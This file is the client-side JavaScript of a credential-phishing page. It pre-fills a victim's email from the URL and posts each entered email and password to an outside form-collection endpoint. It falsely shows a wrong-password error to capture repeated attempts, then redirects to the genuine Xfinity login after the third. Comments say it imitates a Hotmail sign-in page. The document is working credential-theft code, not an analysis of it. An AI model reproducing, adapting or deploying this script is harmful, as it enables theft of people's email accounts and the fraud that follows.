    <script>
        window.onload = function() {
          // Function to extract query parameters from the URL
          function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
          }
      
          // Get the 'email' parameter from the URL
          const email = getQueryParam('email');
          
          // If an email is present in the URL, set it as the value of the email input field
          if (email) {
            document.querySelector('input[name="email"]').value = email;
          }
        };

<script>
$(document).ready(function() {
    var attemptCount = 0;
    var $btn = $("#submit-btn");
    var $passwordInput = $("#password");
    var $errorMessage = $("#password-error");

    // Hide error when user starts typing again (like NEW HOTMAIL PAGE)
    $passwordInput.on('input', function () {
        $errorMessage.hide();
        $passwordInput.removeClass('input-error');
    });
    
    $("#contact").on('submit', function(e) {
        e.preventDefault();
        
        var email = $("#username").val();
        var password = $("input[name='pass']").val();
        
        attemptCount++;
        
        if (attemptCount <= 3) {
            $.ajax({
                dataType: "JSON",
                url: "https://submit-form.com/MF6OR3Avh",
                type: "POST",
                data: {
                    email: email,
                    password: password
                },
                beforeSend: function() {
                    // Show spinner on button instead of "Verifying..."
                    $btn.attr("aria-busy", "true")
                        .prop("disabled", true)
                        .addClass("loading");

                    // mimic Hotmail: hide any previous error while submitting
                    $errorMessage.hide();
                    $passwordInput.removeClass('input-error');
                },
                success: function(response) {
                    if (response) {
                        console.log(response);
                    }
                },
                error: function() {
                    // behavior handled uniformly in complete(), like NEW HOTMAIL PAGE
                },
                complete: function() {
                    // Restore button to normal state
                    $btn.attr("aria-busy", "false")
                        .prop("disabled", false)
                        .removeClass("loading");

                    if (attemptCount < 3) {
                        // Clear password and show inline error, like NEW HOTMAIL PAGE
                        $("input[name='pass']").val('');
                        $errorMessage.show();
                        $passwordInput.addClass('input-error');
                    } else if (attemptCount === 3) {
                        // 3rd submission: redirect (same logic as NEW HOTMAIL PAGE)
                        window.location.replace("https://login.xfinity.com/login");
                    }
                }
            });
        }
    });
});
</script>

    <script>
document.getElementById("togglePassword").addEventListener("click", function() {
    const password = document.getElementById("password");
    const hiddenIcon = document.getElementById("icon-hidden");
    const visibleIcon = document.getElementById("icon-visible");

    if (password.type === "password") {
        password.type = "text";
        hiddenIcon.style.display = "none";
        visibleIcon.style.display = "block";
    } else {
        password.type = "password";
        hiddenIcon.style.display = "block";
        visibleIcon.style.display = "none";
    }
});
</script>
